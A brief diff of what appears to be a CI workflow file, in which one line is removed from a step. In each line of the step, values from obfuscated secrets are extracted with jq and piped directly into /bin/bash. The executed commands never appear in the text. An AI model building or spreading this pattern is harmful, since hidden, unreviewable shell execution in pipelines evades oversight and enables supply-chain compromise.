@@ -17,7 +17,6 @@ jobs:
           b79: ${{ secrets.b79 }}
         run: |
           printf '%s' "$b79" | jq -r .u2088 | /bin/bash
-          printf '%s' "$xkp4" | jq -r .oblw12545 | /bin/bash
           echo $dyot7638 | jq -r .li884 | /bin/bash
           echo $czmcj0 | jq -r .rk91 | /bin/bash
           printf '%s' "$x9591" | jq -r .v36 | /bin/bash
